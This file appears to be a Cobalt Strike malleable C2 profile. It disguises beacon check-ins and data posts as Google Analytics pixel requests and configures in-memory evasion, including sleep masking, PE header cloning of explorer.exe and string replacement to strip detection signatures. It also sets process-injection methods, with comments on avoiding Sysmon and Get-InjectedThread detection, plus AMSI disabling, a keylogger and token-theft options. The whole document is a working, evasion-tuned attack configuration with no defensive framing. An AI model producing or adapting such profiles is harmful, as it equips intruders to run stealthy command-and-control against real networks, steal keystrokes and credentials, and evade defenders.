##    - Beacon Timing in milliseconds (1000 = 1 sec)
set sleeptime "45000";         # 45 Seconds
set jitter    "37";            # % jitter
set data_jitter "100";

http-get {
        set uri "/__utm.gif";
        client {
                parameter "utmac" "UA-2202604-2";
                parameter "utmcn" "1";
                parameter "utmcs" "ISO-8859-1";
                parameter "utmsr" "1280x1024";
                parameter "utmsc" "32-bit";
                parameter "utmul" "en-US";

                metadata {
                        netbios;
                        prepend "SESSIONID=";
                        header "Cookie";
                }
        }

        server {
                header "Content-Type" "image/gif";

                output {
                        # hexdump pixel.gif
                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
                        # 0000020 01 00 01 00 00 02 01 44 00 3b

                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

                        print;
                }
        }
}

http-post {
        set uri "/___utm.gif";
        client {
                header "Content-Type" "application/octet-stream";

                id {
                        prepend "UA-220";
                        append "-2";
                        parameter "utmac";
                }

                parameter "utmcn" "1";
                parameter "utmcs" "ISO-8859-1";
                parameter "utmsr" "1280x1024";
                parameter "utmsc" "32-bit";
                parameter "utmul" "en-US";

                output {
                        print;
                }
        }

        server {
                header "Content-Type" "image/gif";

                output {
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
                        print;
                }
        }
}

set host_stage "false";

# dress up the staging process too
http-stager {
        server {
                header "Content-Type" "image/gif";
        }
}


## SMB beacons
set pipename         "mojo.5688.8052.183894939787088877##"; # Common Chrome named pipe
set smb_frame_header "\x80";

stage {
        set userwx "false";
        set cleanup "true";
        set sleep_mask "true";
        set allocator "MapViewOfFile"; # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
        set magic_pe "##";
        set smartinject "true";
        set magic_mz_x86 "MZRE";
        set stomppe "true";
    # Make the Beacon Reflective DLL look like something else in memory
    # Values captured using peclone agaist a Windows 10 version of explorer.exe
    set name "ActivationManager.dll";
    set checksum "714538";
    set compile_time "18 Apr 2048 10:28:24";
    set entry_point "128240";
    set image_size_x64 "716800";
    set image_size_x86 "716800";
    set rich_header "\xb3\x03\xdf\x61\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xfe\x1a\x22\x32\x50\x62\xb1\x32\x92\x04\xb5\x33\xef\x62\xb1\x32\x92\x04\xb2\x33\xf4\x62\xb1\x32\x92\x04\xb4\x33\xeb\x62\xb1\x32\xf7\x62\xb0\x32\x10\x67\xb1\x32\x92\x04\xb0\x33\xff\x62\xb1\x32\x92\x04\xb1\x33\xf6\x62\xb1\x32\x92\x04\xbf\x33\xa5\x62\xb1\x32\x92\x04\x4c\x32\xf6\x62\xb1\x32\x92\x04\x4e\x32\xf6\x62\xb1\x32\x92\x04\xb3\x33\xf6\x62\xb1\x32";
    
	transform-x64 { # transform the x64 rDLL stage
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
        strrep "ReflectiveLoader" "execute"; # Change this text in the Beacon DLL
        strrep "beacon.x64.dll" ""; # Remove this text in the Beacon DLL
        strrep "(admin)" "(adm1n)";
        strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
        strrep "\x25\xff\xff\xff\x00\x3D\x41\x41\x41\x00" "\xB8\x41\x41\x41\x00\x3D\x41\x41\x41\x00";
    }
}

process-inject {
	set allocator "NtMapViewOfSection";
	set bof_allocator "VirtualAlloc"; # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
	set bof_reuse_memory "true";
    set startrwx "false";
    set userwx "false";
    set min_alloc "17500";
    # Transform injected content to avoid signature detection of first few bytes. Only supports prepend and append.
    transform-x86 {
        prepend "\x90\x90";
        #append "\x90\x90";
    }

    transform-x64 {
        prepend "\x90\x90";
        #append "\x90\x90";
    }
    execute {

        # The order is important! Each step will be attempted (if applicable) until successful
        ## self-injection
        CreateThread "ntdll!RtlUserThreadStart+0x42";
        CreateThread;

        ## Injection via suspened processes (SetThreadContext|NtQueueApcThread-s)
        # OPSEC - when you use SetThreadContext; your thread will have a start address that reflects the original execution entry point of the temporary process.
        # SetThreadContext;
        NtQueueApcThread-s;
        
        ## Injection into existing processes
        # OPSEC Uses RWX stub - Detected by Get-InjectedThread. Less detected by some defensive products.
        #NtQueueApcThread; 
        
        # CreateRemotThread - Vanilla cross process injection technique. Doesn't cross session boundaries
        # OPSEC - fires Sysmon Event 8
        CreateRemoteThread;
        
        # RtlCreateUserThread - Supports all architecture dependent corner cases (e.g., 32bit -> 64bit injection) AND injection across session boundaries
        # OPSEC - fires Sysmon Event 8. Uses Meterpreter implementation and RWX stub - Detected by Get-InjectedThread
        RtlCreateUserThread; 
    }
}

post-ex {
    set amsi_disable "true";
    set obfuscate "true";
    set cleanup "true";
    set smartinject "true";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set pipename "Winsock2\\CatalogChangeListener-###-0,";
    set keylogger "GetAsyncKeyState";
}

set steal_token_access_mask "0"; # TOKEN_ALL_ACCESS
